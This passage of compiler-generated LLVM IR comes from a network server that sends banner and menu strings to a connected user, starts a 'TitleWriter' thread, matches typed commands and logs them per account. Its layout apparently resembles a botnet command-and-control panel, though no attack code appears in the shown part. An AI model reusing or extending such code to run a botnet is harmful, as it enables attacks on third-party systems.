  %453 = call i32 @pthread_create(i64* noundef %6, %union.pthread_attr_t* noundef null, i8* (i8*)* noundef @TitleWriter, i8* noundef %452) #9
  %454 = getelementptr inbounds [80 x i8], [80 x i8]* %28, i64 0, i64 0
  %455 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %454, i8* noundef getelementptr inbounds ([29 x i8], [29 x i8]* @.str.72, i64 0, i64 0)) #9
  %456 = getelementptr inbounds [80 x i8], [80 x i8]* %29, i64 0, i64 0
  %457 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %456, i8* noundef getelementptr inbounds ([62 x i8], [62 x i8]* @.str.73, i64 0, i64 0)) #9
  %458 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i64 0, i64 0
  %459 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %458, i8* noundef getelementptr inbounds ([66 x i8], [66 x i8]* @.str.74, i64 0, i64 0)) #9
  %460 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i64 0, i64 0
  %461 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %460, i8* noundef getelementptr inbounds ([54 x i8], [54 x i8]* @.str.75, i64 0, i64 0)) #9
  %462 = getelementptr inbounds [80 x i8], [80 x i8]* %32, i64 0, i64 0
  %463 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %462, i8* noundef getelementptr inbounds ([48 x i8], [48 x i8]* @.str.76, i64 0, i64 0)) #9
  %464 = getelementptr inbounds [80 x i8], [80 x i8]* %33, i64 0, i64 0
  %465 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %464, i8* noundef getelementptr inbounds ([56 x i8], [56 x i8]* @.str.77, i64 0, i64 0)) #9
  %466 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i64 0, i64 0
  %467 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %466, i8* noundef getelementptr inbounds ([56 x i8], [56 x i8]* @.str.78, i64 0, i64 0)) #9
  %468 = getelementptr inbounds [80 x i8], [80 x i8]* %35, i64 0, i64 0
  %469 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %468, i8* noundef getelementptr inbounds ([50 x i8], [50 x i8]* @.str.79, i64 0, i64 0)) #9
  %470 = getelementptr inbounds [80 x i8], [80 x i8]* %36, i64 0, i64 0
  %471 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %470, i8* noundef getelementptr inbounds ([29 x i8], [29 x i8]* @.str.80, i64 0, i64 0)) #9
  %472 = getelementptr inbounds [80 x i8], [80 x i8]* %37, i64 0, i64 0
  %473 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %472, i8* noundef getelementptr inbounds ([36 x i8], [36 x i8]* @.str.81, i64 0, i64 0)) #9
  %474 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i64 0, i64 0
  %475 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %474, i8* noundef getelementptr inbounds ([61 x i8], [61 x i8]* @.str.82, i64 0, i64 0)) #9
  %476 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i64 0, i64 0
  %477 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %476, i8* noundef getelementptr inbounds ([61 x i8], [61 x i8]* @.str.83, i64 0, i64 0)) #9
  %478 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i64 0, i64 0
  %479 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %478, i8* noundef getelementptr inbounds ([47 x i8], [47 x i8]* @.str.84, i64 0, i64 0)) #9
  %480 = getelementptr inbounds [80 x i8], [80 x i8]* %41, i64 0, i64 0
  %481 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %480, i8* noundef getelementptr inbounds ([40 x i8], [40 x i8]* @.str.85, i64 0, i64 0)) #9
  %482 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i64 0, i64 0
  %483 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %482, i8* noundef getelementptr inbounds ([38 x i8], [38 x i8]* @.str.86, i64 0, i64 0)) #9
  %484 = getelementptr inbounds [80 x i8], [80 x i8]* %43, i64 0, i64 0
  %485 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %484, i8* noundef getelementptr inbounds ([38 x i8], [38 x i8]* @.str.87, i64 0, i64 0)) #9
  %486 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i64 0, i64 0
  %487 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %486, i8* noundef getelementptr inbounds ([46 x i8], [46 x i8]* @.str.88, i64 0, i64 0)) #9
  %488 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i64 0, i64 0
  %489 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %488, i8* noundef getelementptr inbounds ([52 x i8], [52 x i8]* @.str.89, i64 0, i64 0)) #9
  %490 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i64 0, i64 0
  %491 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %490, i8* noundef getelementptr inbounds ([38 x i8], [38 x i8]* @.str.90, i64 0, i64 0)) #9
  %492 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i64 0, i64 0
  %493 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %492, i8* noundef getelementptr inbounds ([35 x i8], [35 x i8]* @.str.91, i64 0, i64 0)) #9
  %494 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i64 0, i64 0
  %495 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %494, i8* noundef getelementptr inbounds ([49 x i8], [49 x i8]* @.str.92, i64 0, i64 0)) #9
  %496 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i64 0, i64 0
  %497 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %496, i8* noundef getelementptr inbounds ([47 x i8], [47 x i8]* @.str.93, i64 0, i64 0)) #9
  %498 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i64 0, i64 0
  %499 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %498, i8* noundef getelementptr inbounds ([49 x i8], [49 x i8]* @.str.94, i64 0, i64 0)) #9
  %500 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i64 0, i64 0
  %501 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %500, i8* noundef getelementptr inbounds ([44 x i8], [44 x i8]* @.str.95, i64 0, i64 0)) #9
  %502 = getelementptr inbounds [80 x i8], [80 x i8]* %52, i64 0, i64 0
  %503 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %502, i8* noundef getelementptr inbounds ([40 x i8], [40 x i8]* @.str.96, i64 0, i64 0)) #9
  %504 = load i32, i32* %4, align 4
  %505 = getelementptr inbounds [80 x i8], [80 x i8]* %28, i64 0, i64 0
  %506 = getelementptr inbounds [80 x i8], [80 x i8]* %28, i64 0, i64 0
  %507 = call i64 @strlen(i8* noundef %506) #8
  %508 = call i64 @send(i32 noundef %504, i8* noundef %505, i64 noundef %507, i32 noundef 16384)
  %509 = icmp eq i64 %508, -1
  br i1 %509, label %510, label %511

510:                                              ; preds = %451
  br label %884

511:                                              ; preds = %451
  %512 = load i32, i32* %4, align 4
  %513 = getelementptr inbounds [80 x i8], [80 x i8]* %29, i64 0, i64 0
  %514 = getelementptr inbounds [80 x i8], [80 x i8]* %29, i64 0, i64 0
  %515 = call i64 @strlen(i8* noundef %514) #8
  %516 = call i64 @send(i32 noundef %512, i8* noundef %513, i64 noundef %515, i32 noundef 16384)
  %517 = icmp eq i64 %516, -1
  br i1 %517, label %518, label %519

518:                                              ; preds = %511
  br label %884

519:                                              ; preds = %511
  %520 = load i32, i32* %4, align 4
  %521 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i64 0, i64 0
  %522 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i64 0, i64 0
  %523 = call i64 @strlen(i8* noundef %522) #8
  %524 = call i64 @send(i32 noundef %520, i8* noundef %521, i64 noundef %523, i32 noundef 16384)
  %525 = icmp eq i64 %524, -1
  br i1 %525, label %526, label %527

526:                                              ; preds = %519
  br label %884

527:                                              ; preds = %519
  %528 = load i32, i32* %4, align 4
  %529 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i64 0, i64 0
  %530 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i64 0, i64 0
  %531 = call i64 @strlen(i8* noundef %530) #8
  %532 = call i64 @send(i32 noundef %528, i8* noundef %529, i64 noundef %531, i32 noundef 16384)
  %533 = icmp eq i64 %532, -1
  br i1 %533, label %534, label %535

534:                                              ; preds = %527
  br label %884

535:                                              ; preds = %527
  %536 = load i32, i32* %4, align 4
  %537 = getelementptr inbounds [80 x i8], [80 x i8]* %32, i64 0, i64 0
  %538 = getelementptr inbounds [80 x i8], [80 x i8]* %32, i64 0, i64 0
  %539 = call i64 @strlen(i8* noundef %538) #8
  %540 = call i64 @send(i32 noundef %536, i8* noundef %537, i64 noundef %539, i32 noundef 16384)
  %541 = icmp eq i64 %540, -1
  br i1 %541, label %542, label %543

542:                                              ; preds = %535
  br label %884

543:                                              ; preds = %535
  %544 = load i32, i32* %4, align 4
  %545 = getelementptr inbounds [80 x i8], [80 x i8]* %33, i64 0, i64 0
  %546 = getelementptr inbounds [80 x i8], [80 x i8]* %33, i64 0, i64 0
  %547 = call i64 @strlen(i8* noundef %546) #8
  %548 = call i64 @send(i32 noundef %544, i8* noundef %545, i64 noundef %547, i32 noundef 16384)
  %549 = icmp eq i64 %548, -1
  br i1 %549, label %550, label %551

550:                                              ; preds = %543
  br label %884

551:                                              ; preds = %543
  %552 = load i32, i32* %4, align 4
  %553 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i64 0, i64 0
  %554 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i64 0, i64 0
  %555 = call i64 @strlen(i8* noundef %554) #8
  %556 = call i64 @send(i32 noundef %552, i8* noundef %553, i64 noundef %555, i32 noundef 16384)
  %557 = icmp eq i64 %556, -1
  br i1 %557, label %558, label %559

558:                                              ; preds = %551
  br label %884

559:                                              ; preds = %551
  %560 = load i32, i32* %4, align 4
  %561 = getelementptr inbounds [80 x i8], [80 x i8]* %35, i64 0, i64 0
  %562 = getelementptr inbounds [80 x i8], [80 x i8]* %35, i64 0, i64 0
  %563 = call i64 @strlen(i8* noundef %562) #8
  %564 = call i64 @send(i32 noundef %560, i8* noundef %561, i64 noundef %563, i32 noundef 16384)
  %565 = icmp eq i64 %564, -1
  br i1 %565, label %566, label %567

566:                                              ; preds = %559
  br label %884

567:                                              ; preds = %559
  %568 = load i32, i32* %4, align 4
  %569 = getelementptr inbounds [80 x i8], [80 x i8]* %36, i64 0, i64 0
  %570 = getelementptr inbounds [80 x i8], [80 x i8]* %36, i64 0, i64 0
  %571 = call i64 @strlen(i8* noundef %570) #8
  %572 = call i64 @send(i32 noundef %568, i8* noundef %569, i64 noundef %571, i32 noundef 16384)
  %573 = icmp eq i64 %572, -1
  br i1 %573, label %574, label %575

574:                                              ; preds = %567
  br label %884

575:                                              ; preds = %567
  %576 = load i32, i32* %4, align 4
  %577 = getelementptr inbounds [80 x i8], [80 x i8]* %37, i64 0, i64 0
  %578 = getelementptr inbounds [80 x i8], [80 x i8]* %37, i64 0, i64 0
  %579 = call i64 @strlen(i8* noundef %578) #8
  %580 = call i64 @send(i32 noundef %576, i8* noundef %577, i64 noundef %579, i32 noundef 16384)
  %581 = icmp eq i64 %580, -1
  br i1 %581, label %582, label %583

582:                                              ; preds = %575
  br label %884

583:                                              ; preds = %575
  %584 = load i32, i32* %4, align 4
  %585 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i64 0, i64 0
  %586 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i64 0, i64 0
  %587 = call i64 @strlen(i8* noundef %586) #8
  %588 = call i64 @send(i32 noundef %584, i8* noundef %585, i64 noundef %587, i32 noundef 16384)
  %589 = icmp eq i64 %588, -1
  br i1 %589, label %590, label %591

590:                                              ; preds = %583
  br label %884

591:                                              ; preds = %583
  %592 = load i32, i32* %4, align 4
  %593 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i64 0, i64 0
  %594 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i64 0, i64 0
  %595 = call i64 @strlen(i8* noundef %594) #8
  %596 = call i64 @send(i32 noundef %592, i8* noundef %593, i64 noundef %595, i32 noundef 16384)
  %597 = icmp eq i64 %596, -1
  br i1 %597, label %598, label %599

598:                                              ; preds = %591
  br label %884

599:                                              ; preds = %591
  %600 = load i32, i32* %4, align 4
  %601 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i64 0, i64 0
  %602 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i64 0, i64 0
  %603 = call i64 @strlen(i8* noundef %602) #8
  %604 = call i64 @send(i32 noundef %600, i8* noundef %601, i64 noundef %603, i32 noundef 16384)
  %605 = icmp eq i64 %604, -1
  br i1 %605, label %606, label %607

606:                                              ; preds = %599
  br label %884

607:                                              ; preds = %599
  %608 = load i32, i32* %4, align 4
  %609 = getelementptr inbounds [80 x i8], [80 x i8]* %41, i64 0, i64 0
  %610 = getelementptr inbounds [80 x i8], [80 x i8]* %41, i64 0, i64 0
  %611 = call i64 @strlen(i8* noundef %610) #8
  %612 = call i64 @send(i32 noundef %608, i8* noundef %609, i64 noundef %611, i32 noundef 16384)
  %613 = icmp eq i64 %612, -1
  br i1 %613, label %614, label %615

614:                                              ; preds = %607
  br label %884

615:                                              ; preds = %607
  %616 = load i32, i32* %4, align 4
  %617 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i64 0, i64 0
  %618 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i64 0, i64 0
  %619 = call i64 @strlen(i8* noundef %618) #8
  %620 = call i64 @send(i32 noundef %616, i8* noundef %617, i64 noundef %619, i32 noundef 16384)
  %621 = icmp eq i64 %620, -1
  br i1 %621, label %622, label %623

622:                                              ; preds = %615
  br label %884

623:                                              ; preds = %615
  %624 = load i32, i32* %4, align 4
  %625 = getelementptr inbounds [80 x i8], [80 x i8]* %43, i64 0, i64 0
  %626 = getelementptr inbounds [80 x i8], [80 x i8]* %43, i64 0, i64 0
  %627 = call i64 @strlen(i8* noundef %626) #8
  %628 = call i64 @send(i32 noundef %624, i8* noundef %625, i64 noundef %627, i32 noundef 16384)
  %629 = icmp eq i64 %628, -1
  br i1 %629, label %630, label %631

630:                                              ; preds = %623
  br label %884

631:                                              ; preds = %623
  %632 = load i32, i32* %4, align 4
  %633 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i64 0, i64 0
  %634 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i64 0, i64 0
  %635 = call i64 @strlen(i8* noundef %634) #8
  %636 = call i64 @send(i32 noundef %632, i8* noundef %633, i64 noundef %635, i32 noundef 16384)
  %637 = icmp eq i64 %636, -1
  br i1 %637, label %638, label %639

638:                                              ; preds = %631
  br label %884

639:                                              ; preds = %631
  %640 = load i32, i32* %4, align 4
  %641 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i64 0, i64 0
  %642 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i64 0, i64 0
  %643 = call i64 @strlen(i8* noundef %642) #8
  %644 = call i64 @send(i32 noundef %640, i8* noundef %641, i64 noundef %643, i32 noundef 16384)
  %645 = icmp eq i64 %644, -1
  br i1 %645, label %646, label %647

646:                                              ; preds = %639
  br label %884

647:                                              ; preds = %639
  %648 = load i32, i32* %4, align 4
  %649 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i64 0, i64 0
  %650 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i64 0, i64 0
  %651 = call i64 @strlen(i8* noundef %650) #8
  %652 = call i64 @send(i32 noundef %648, i8* noundef %649, i64 noundef %651, i32 noundef 16384)
  %653 = icmp eq i64 %652, -1
  br i1 %653, label %654, label %655

654:                                              ; preds = %647
  br label %884

655:                                              ; preds = %647
  %656 = load i32, i32* %4, align 4
  %657 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i64 0, i64 0
  %658 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i64 0, i64 0
  %659 = call i64 @strlen(i8* noundef %658) #8
  %660 = call i64 @send(i32 noundef %656, i8* noundef %657, i64 noundef %659, i32 noundef 16384)
  %661 = icmp eq i64 %660, -1
  br i1 %661, label %662, label %663

662:                                              ; preds = %655
  br label %884

663:                                              ; preds = %655
  %664 = load i32, i32* %4, align 4
  %665 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i64 0, i64 0
  %666 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i64 0, i64 0
  %667 = call i64 @strlen(i8* noundef %666) #8
  %668 = call i64 @send(i32 noundef %664, i8* noundef %665, i64 noundef %667, i32 noundef 16384)
  %669 = icmp eq i64 %668, -1
  br i1 %669, label %670, label %671

670:                                              ; preds = %663
  br label %884

671:                                              ; preds = %663
  %672 = load i32, i32* %4, align 4
  %673 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i64 0, i64 0
  %674 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i64 0, i64 0
  %675 = call i64 @strlen(i8* noundef %674) #8
  %676 = call i64 @send(i32 noundef %672, i8* noundef %673, i64 noundef %675, i32 noundef 16384)
  %677 = icmp eq i64 %676, -1
  br i1 %677, label %678, label %679

678:                                              ; preds = %671
  br label %884

679:                                              ; preds = %671
  %680 = load i32, i32* %4, align 4
  %681 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i64 0, i64 0
  %682 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i64 0, i64 0
  %683 = call i64 @strlen(i8* noundef %682) #8
  %684 = call i64 @send(i32 noundef %680, i8* noundef %681, i64 noundef %683, i32 noundef 16384)
  %685 = icmp eq i64 %684, -1
  br i1 %685, label %686, label %687

686:                                              ; preds = %679
  br label %884

687:                                              ; preds = %679
  %688 = load i32, i32* %4, align 4
  %689 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i64 0, i64 0
  %690 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i64 0, i64 0
  %691 = call i64 @strlen(i8* noundef %690) #8
  %692 = call i64 @send(i32 noundef %688, i8* noundef %689, i64 noundef %691, i32 noundef 16384)
  %693 = icmp eq i64 %692, -1
  br i1 %693, label %694, label %695

694:                                              ; preds = %687
  br label %884

695:                                              ; preds = %687
  %696 = load i32, i32* %4, align 4
  %697 = getelementptr inbounds [80 x i8], [80 x i8]* %52, i64 0, i64 0
  %698 = getelementptr inbounds [80 x i8], [80 x i8]* %52, i64 0, i64 0
  %699 = call i64 @strlen(i8* noundef %698) #8
  %700 = call i64 @send(i32 noundef %696, i8* noundef %697, i64 noundef %699, i32 noundef 16384)
  %701 = icmp eq i64 %700, -1
  br i1 %701, label %702, label %703

702:                                              ; preds = %695
  br label %884

703:                                              ; preds = %695
  %704 = load i8*, i8** %3, align 8
  %705 = call i32 @pthread_create(i64* noundef %6, %union.pthread_attr_t* noundef null, i8* (i8*)* noundef @TitleWriter, i8* noundef %704) #9
  br label %289, !llvm.loop !19

706:                                              ; preds = %447
  %707 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %708 = call i8* @strstr(i8* noundef %707, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.97, i64 0, i64 0)) #8
  %709 = icmp ne i8* %708, null
  br i1 %709, label %710, label %722

710:                                              ; preds = %706
  %711 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %711, i8 0, i64 2048, i1 false)
  %712 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i64 0, i64 0
  %713 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %712, i8* noundef getelementptr inbounds ([14 x i8], [14 x i8]* @.str.98, i64 0, i64 0)) #9
  %714 = load i32, i32* %4, align 4
  %715 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i64 0, i64 0
  %716 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i64 0, i64 0
  %717 = call i64 @strlen(i8* noundef %716) #8
  %718 = call i64 @send(i32 noundef %714, i8* noundef %715, i64 noundef %717, i32 noundef 16384)
  %719 = icmp eq i64 %718, -1
  br i1 %719, label %720, label %721

720:                                              ; preds = %710
  br label %884

721:                                              ; preds = %710
  br label %289, !llvm.loop !19

722:                                              ; preds = %706
  %723 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %724 = call i8* @strstr(i8* noundef %723, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.99, i64 0, i64 0)) #8
  %725 = icmp ne i8* %724, null
  br i1 %725, label %726, label %817

726:                                              ; preds = %722
  %727 = getelementptr inbounds [2048 x i8], [2048 x i8]* %54, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %727, i8 0, i64 2048, i1 false)
  %728 = getelementptr inbounds [2048 x i8], [2048 x i8]* %54, i64 0, i64 0
  %729 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %728, i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.100, i64 0, i64 0)) #9
  %730 = load i32, i32* %4, align 4
  %731 = getelementptr inbounds [2048 x i8], [2048 x i8]* %54, i64 0, i64 0
  %732 = getelementptr inbounds [2048 x i8], [2048 x i8]* %54, i64 0, i64 0
  %733 = call i64 @strlen(i8* noundef %732) #8
  %734 = call i64 @send(i32 noundef %730, i8* noundef %731, i64 noundef %733, i32 noundef 16384)
  %735 = icmp eq i64 %734, -1
  br i1 %735, label %736, label %737

736:                                              ; preds = %726
  br label %884

737:                                              ; preds = %726
  %738 = load i32, i32* %4, align 4
  %739 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %740 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %741 = call i64 @strlen(i8* noundef %740) #8
  %742 = call i64 @send(i32 noundef %738, i8* noundef %739, i64 noundef %741, i32 noundef 16384)
  %743 = icmp eq i64 %742, -1
  br i1 %743, label %744, label %745

744:                                              ; preds = %737
  br label %884

745:                                              ; preds = %737
  %746 = load i32, i32* %4, align 4
  %747 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %748 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %749 = call i64 @strlen(i8* noundef %748) #8
  %750 = call i64 @send(i32 noundef %746, i8* noundef %747, i64 noundef %749, i32 noundef 16384)
  %751 = icmp eq i64 %750, -1
  br i1 %751, label %752, label %753

752:                                              ; preds = %745
  br label %884

753:                                              ; preds = %745
  %754 = load i32, i32* %4, align 4
  %755 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %756 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %757 = call i64 @strlen(i8* noundef %756) #8
  %758 = call i64 @send(i32 noundef %754, i8* noundef %755, i64 noundef %757, i32 noundef 16384)
  %759 = icmp eq i64 %758, -1
  br i1 %759, label %760, label %761

760:                                              ; preds = %753
  br label %884

761:                                              ; preds = %753
  %762 = load i32, i32* %4, align 4
  %763 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %764 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %765 = call i64 @strlen(i8* noundef %764) #8
  %766 = call i64 @send(i32 noundef %762, i8* noundef %763, i64 noundef %765, i32 noundef 16384)
  %767 = icmp eq i64 %766, -1
  br i1 %767, label %768, label %769

768:                                              ; preds = %761
  br label %884

769:                                              ; preds = %761
  %770 = load i32, i32* %4, align 4
  %771 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %772 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %773 = call i64 @strlen(i8* noundef %772) #8
  %774 = call i64 @send(i32 noundef %770, i8* noundef %771, i64 noundef %773, i32 noundef 16384)
  %775 = icmp eq i64 %774, -1
  br i1 %775, label %776, label %777

776:                                              ; preds = %769
  br label %884

777:                                              ; preds = %769
  %778 = load i32, i32* %4, align 4
  %779 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %780 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %781 = call i64 @strlen(i8* noundef %780) #8
  %782 = call i64 @send(i32 noundef %778, i8* noundef %779, i64 noundef %781, i32 noundef 16384)
  %783 = icmp eq i64 %782, -1
  br i1 %783, label %784, label %785

784:                                              ; preds = %777
  br label %884

785:                                              ; preds = %777
  %786 = load i32, i32* %4, align 4
  %787 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %788 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %789 = call i64 @strlen(i8* noundef %788) #8
  %790 = call i64 @send(i32 noundef %786, i8* noundef %787, i64 noundef %789, i32 noundef 16384)
  %791 = icmp eq i64 %790, -1
  br i1 %791, label %792, label %793

792:                                              ; preds = %785
  br label %884

793:                                              ; preds = %785
  %794 = load i32, i32* %4, align 4
  %795 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i64 0, i64 0
  %796 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i64 0, i64 0
  %797 = call i64 @strlen(i8* noundef %796) #8
  %798 = call i64 @send(i32 noundef %794, i8* noundef %795, i64 noundef %797, i32 noundef 16384)
  %799 = icmp eq i64 %798, -1
  br i1 %799, label %800, label %801

800:                                              ; preds = %793
  br label %884

801:                                              ; preds = %793
  br label %802

802:                                              ; preds = %801
  %803 = load i32, i32* %4, align 4
  %804 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i64 0, i64 0
  %805 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i64 0, i64 0
  %806 = call i64 @strlen(i8* noundef %805) #8
  %807 = call i64 @send(i32 noundef %803, i8* noundef %804, i64 noundef %806, i32 noundef 16384)
  %808 = icmp eq i64 %807, -1
  br i1 %808, label %809, label %810

809:                                              ; preds = %802
  br label %884

810:                                              ; preds = %802
  %811 = load i32, i32* %4, align 4
  %812 = call i64 @send(i32 noundef %811, i8* noundef getelementptr inbounds ([13 x i8], [13 x i8]* @.str.35, i64 0, i64 0), i64 noundef 12, i32 noundef 16384)
  %813 = icmp eq i64 %812, -1
  br i1 %813, label %814, label %815

814:                                              ; preds = %810
  br label %884

815:                                              ; preds = %810
  br label %816

816:                                              ; preds = %815
  br label %289, !llvm.loop !19

817:                                              ; preds = %722
  %818 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %819 = call i8* @strstr(i8* noundef %818, i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.101, i64 0, i64 0)) #8
  %820 = icmp ne i8* %819, null
  br i1 %820, label %821, label %839

821:                                              ; preds = %817
  %822 = getelementptr inbounds [2048 x i8], [2048 x i8]* %55, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %822, i8 0, i64 2048, i1 false)
  %823 = getelementptr inbounds [2048 x i8], [2048 x i8]* %55, i64 0, i64 0
  %824 = load i32, i32* %5, align 4
  %825 = sext i32 %824 to i64
  %826 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %825
  %827 = getelementptr inbounds %struct.login_info, %struct.login_info* %826, i32 0, i32 0
  %828 = getelementptr inbounds [20 x i8], [20 x i8]* %827, i64 0, i64 0
  %829 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %823, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i64 0, i64 0), i8* noundef %828) #9
  %830 = load i32, i32* %4, align 4
  %831 = getelementptr inbounds [2048 x i8], [2048 x i8]* %55, i64 0, i64 0
  %832 = getelementptr inbounds [2048 x i8], [2048 x i8]* %55, i64 0, i64 0
  %833 = call i64 @strlen(i8* noundef %832) #8
  %834 = call i64 @send(i32 noundef %830, i8* noundef %831, i64 noundef %833, i32 noundef 16384)
  %835 = icmp eq i64 %834, -1
  br i1 %835, label %836, label %837

836:                                              ; preds = %821
  br label %884

837:                                              ; preds = %821
  %838 = call i32 @sleep(i32 noundef 5)
  br label %884

839:                                              ; preds = %817
  %840 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* noundef %840)
  %841 = load i32, i32* %4, align 4
  %842 = call i64 @send(i32 noundef %841, i8* noundef getelementptr inbounds ([12 x i8], [12 x i8]* @.str.103, i64 0, i64 0), i64 noundef 11, i32 noundef 16384)
  %843 = icmp eq i64 %842, -1
  br i1 %843, label %844, label %845

844:                                              ; preds = %839
  br label %884

845:                                              ; preds = %839
  %846 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %847 = call i64 @strlen(i8* noundef %846) #8
  %848 = icmp eq i64 %847, 0
  br i1 %848, label %849, label %850

849:                                              ; preds = %845
  br label %289, !llvm.loop !19

850:                                              ; preds = %845
  %851 = load i32, i32* %5, align 4
  %852 = sext i32 %851 to i64
  %853 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %852
  %854 = getelementptr inbounds %struct.login_info, %struct.login_info* %853, i32 0, i32 0
  %855 = getelementptr inbounds [20 x i8], [20 x i8]* %854, i64 0, i64 0
  %856 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %857 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.104, i64 0, i64 0), i8* noundef %855, i8* noundef %856)
